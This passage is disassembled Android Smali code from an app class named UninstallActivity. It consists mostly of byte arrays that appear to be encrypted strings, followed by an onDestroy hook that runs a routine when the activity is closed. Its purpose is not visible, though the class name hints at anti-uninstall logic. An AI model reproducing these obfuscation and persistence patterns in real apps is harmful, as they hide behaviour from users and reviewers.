        0xbt
        0x7et
        0x18t
        0x4et
        0x35t
        -0x4dt
        0x67t
        0x53t
        0x4ft
        0x6et
        -0x5bt
        -0x5ct
        0x31t
        -0x4dt
    .end array-data

    :array_29
    .array-data 1
        0x12t
        0x73t
        0x2bt
        0xbt
        0x61t
        0x3bt
        0x58t
        -0x21t
    .end array-data

    :array_2a
    .array-data 1
        -0x2at
        -0x12t
        0x66t
        -0x31t
        -0x4dt
        -0x29t
        -0x56t
    .end array-data

    :array_2b
    .array-data 1
        -0x43t
        -0x71t
        0xat
        -0x55t
        0x77t
        0x66t
        -0x28t
        -0x33t
    .end array-data

    :array_2c
    .array-data 1
        0x7t
        0x67t
        -0x6dt
        0x44t
        0x75t
        -0x7bt
        0x75t
        -0x15t
        0x61t
        0x2dt
        0x3t
        0x45t
        0x4ft
        -0x7bt
        0x7et
        -0x15t
        0x6at
        0x2dt
        0xbt
        0x44t
        0x7at
        0x79t
        -0x15t
        -0x16t
        0x5at
        0x2ct
        0x31t
        0x45t
        0x44t
        0x75t
        0x1bt
        -0x77t
        0x7t
        0x48t
        0x62t
        0x15t
        0x25t
        -0x2ct
        0x1bt
        -0x7dt
        0x6t
        0x72t
        -0x6dt
        0x45t
        0x49t
        -0x7bt
        0x7et
        0x1bt
        0x6t
        0x7ct
        0x63t
        0x2bt
        0x24t
        -0x19t
        0x1bt
        -0x79t
        0x7t
        0x48t
        0x62t
        0x14t
        0x25t
        -0x29t
        0x1bt
        -0x7dt
        0x7t
        0x41t
        0x63t
        0x25t
        -0x2ct
        -0x7ct
        0x4at
        0x1bt
        0x7t
        0x4ft
        0x63t
        0x25t
        0x25t
        -0x23t
        0x1bt
        -0x7dt
        0x7t
        0x41t
        -0x6dt
        0x44t
        0x77t
        -0x7ct
        0x4at
        -0x16t
        0x55t
        0x2ct
        0x33t
        0x45t
        0x4at
        -0x7bt
        0x72t
        -0x16t
        0x56t
        0x2ct
        0x31t
        0x45t
        0x46t
        -0x7bt
        0x75t
        -0x15t
        0x6bt
    .end array-data

    nop

    :array_2d
    .array-data 1
        -0x29t
        -0x3t
        -0x4dt
        -0x6bt
        -0xct
        0x55t
        -0x35t
        0x3bt
    .end array-data

    :array_2e
    .array-data 1
        -0xdt
        0x57t
        0x1dt
        -0xct
        -0x7bt
        0xet
        0x75t
        0x50t
        -0xet
        0x6ct
        0x1ct
        -0x3et
        -0x7ct
        0x32t
    .end array-data

    nop

    :array_2f
    .array-data 1
        0x22t
        -0x2ct
        -0x33t
        0x40t
        0x55t
        -0x42t
        -0x5bt
        -0x15t
    .end array-data

    :array_30
    .array-data 1
        -0x1ft
        0x5bt
        -0x2t
        -0x59t
        -0x30t
        0xct
        0x58t
        0x74t
        -0x33t
        0x5bt
        -0x14t
        -0x59t
        -0x70t
        0x45t
        0x47t
        0x6at
        -0x24t
        0x54t
        -0x48t
        -0x4ct
        -0x27t
        0x17t
        0x51t
        -0x26t
        0xbt
        0x5at
        -0x48t
        -0x54t
        0x7ft
        -0x3at
        0x4dt
        0x39t
        0x6bt
        -0x64t
        -0x48t
        -0x5ft
        -0x2dt
        0x8t
        0x52t
        0x78t
        -0x24t
        -0xat
        0x35t
        -0x4ct
        -0x27t
        0x9t
        0x2t
        0x7at
        -0x39t
        0x58t
        -0x48t
        -0x53t
        -0x64t
        0x16t
        0x47t
        0x6ct
        -0x78t
        0x51t
        -0xft
        -0x4ft
        -0x34t
        0xat
        0x51t
        0x70t
        -0x24t
        0x5ct
        -0x12t
        -0x53t
    .end array-data

    :array_31
    .array-data 1
        -0x58t
        0x35t
        -0x68t
        -0x3et
        -0x44t
        0x65t
        0x22t
        0x19t
    .end array-data

    :array_32
    .array-data 1
        -0x32t
        0x10t
        0x19t
        -0x64t
        -0x3dt
        -0x53t
        -0x78t
        -0x5at
        -0x3at
        0x14t
        0x18t
    .end array-data

    :array_33
    .array-data 1
        -0x56t
        0x75t
        0x6at
        -0xbt
        -0x53t
        -0x22t
        -0x4t
        -0x39t
    .end array-data

    :array_34
    .array-data 1
        -0x2ft
        0x73t
        -0x56t
        -0x4et
        -0x10t
        -0x4at
        0x14t
        0x5ct
        -0x20t
        0x78t
        -0x48t
        -0x49t
        -0x9t
        -0x4ct
        0x3t
        0x46t
        -0x1ft
        0x73t
        -0xbt
        -0xdt
        -0xdt
        -0x56t
        0x12t
        0x49t
        -0x4bt
        0x60t
        -0x44t
        -0x5ft
        -0x1bt
        -0x50t
        -0x5bt
        -0x65t
        -0x5t
        0x36t
        -0x49t
        -0x44t
        -0x4at
        -0x44t
        0x15t
        0x8t
        -0xat
        0x79t
        -0x4ct
        -0x5dt
        -0x9t
        -0x53t
        0xft
        0x4at
        -0x7t
        0x73t
        -0x7t
        -0x50t
        -0x7t
        -0x49t
        0x46t
        0x5bt
        -0x20t
        0x36t
        -0x43t
        -0x46t
        -0x1bt
        -0x57t
        0x9t
        0x5bt
        -0x4t
        0x62t
        -0x50t
        -0x5bt
        -0x7t
    .end array-data

    nop

    :array_35
    .array-data 1
        -0x6bt
        0x16t
        -0x27t
        -0x2dt
        -0x6at
        -0x27t
        0x66t
        0x28t
    .end array-data

    :array_36
    .array-data 1
        -0x52t
        -0x28t
        -0x34t
        -0x3bt
        -0x3et
        -0x57t
        0x20t
        -0x22t
        -0x5at
        -0x24t
        -0x33t
    .end array-data

    :array_37
    .array-data 1
        -0x36t
        -0x43t
        -0x41t
        -0x54t
        -0x54t
        -0x26t
        0x54t
        -0x41t
    .end array-data

    :array_38
    .array-data 1
        0x1bt
        -0x58t
        -0x70t
        0x67t
        0x7bt
        0x63t
        0xdt
        -0x79t
        0x7bt
        -0xat
        -0x7bt
        0x2dt
        0x2dt
        0x67t
        0x66t
        -0xbt
        0x50t
        -0x4bt
        -0x6t
        0xbt
        0x4at
        0x3dt
        0x76t
        -0x4ft
        0x1bt
        -0x58t
        -0x6dt
        0x64t
        0x40t
        0x73t
        0xdt
        -0x79t
        0x7bt
        -0x8t
        -0x4dt
        0x3ct
        0x27t
        0x7ft
        0x6dt
        -0x7t
        0x47t
        -0x63t
        -0x8t
        0x7t
        0x7et
        0x3et
        0x44t
        -0x5ct
    .end array-data

    :array_39
    .array-data 1
        -0x1t
        0x10t
        0x1dt
        -0x7et
        -0x3et
        -0x25t
        -0x16t
        0x1dt
    .end array-data

    :array_3a
    .array-data 1
        0x59t
        -0x4et
        0x2t
        -0x12t
        -0x9t
        0x3bt
    .end array-data

    nop

    :array_3b
    .array-data 1
        -0x44t
        0x3ft
        -0x46t
        0x6t
        0x4at
        -0x7at
        -0x52t
        -0x4t
    .end array-data

    :array_3c
    .array-data 1
        -0x3at
        -0x31t
        -0x80t
        -0x7at
        -0x23t
        -0x15t
        -0x6t
        0x56t
        -0x3at
        -0x36t
        0x79t
        -0x26t
        -0x77t
        0x68t
        -0x5t
        0x62t
        -0x39t
        -0x5t
        -0x7ft
        -0x5bt
        0x25t
        -0x70t
        -0x7bt
        0x3ct
        -0x65t
        -0x6dt
        -0x4t
        -0x26t
        -0x50t
        -0x70t
        -0x73t
        0x3dt
        -0x48t
        -0x6dt
        -0x18t
        0x22t
        -0x23t
        -0xet
        -0x5t
        0x6ft
        -0x39t
        -0x6t
        0x79t
        -0x25t
        -0x80t
        -0x70t
        -0x78t
        0x3ct
        -0x69t
        -0x6dt
        -0x2t
        -0x25t
        -0x7ct
        -0x6ft
        -0x60t
        -0x3bt
        -0x3at
        -0x32t
        -0x7ft
        -0x45t
        0x25t
        -0x70t
        -0x72t
        0x3ct
        -0x68t
        -0x6dt
        -0x2t
        -0x26t
        -0x49t
        -0x6ft
        -0x5ft
    .end array-data

    :array_3d
    .array-data 1
        0x1ft
        0x4bt
        0x59t
        0x2t
        0x5t
        0x48t
        0x22t
        -0x1bt
    .end array-data

    :array_3e
    .array-data 1
        0x75t
        -0xft
        0x63t
        -0x5ft
        0x7ft
        0x6ft
        -0x1ct
        -0x7bt
        0x75t
        -0xbt
        -0x66t
        -0x3t
        0x0t
        0xct
        -0x48t
        -0x6t
        0x7t
        -0x74t
        0x11t
        -0x3t
        0xft
        0xct
        -0x4at
        -0x6t
        0x7t
    .end array-data

    nop

    :array_3f
    .array-data 1
        -0x53t
        0x54t
        -0x46t
        0x25t
        -0x59t
        -0x2bt
        0x3ct
        0x22t
    .end array-data
.end method

.method protected onDestroy()V
    .locals 1

    sget-boolean v0, Lcom/icontrol/protector/UninstallActivity;->d:Z

    if-nez v0, :cond_0

    const/4 v0, 0x1

    sput-boolean v0, Lcom/icontrol/protector/UninstallActivity;->d:Z

    invoke-virtual {p0}, Lcom/icontrol/protector/UninstallActivity;->a()V

    :cond_0
    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    return-void
.end method
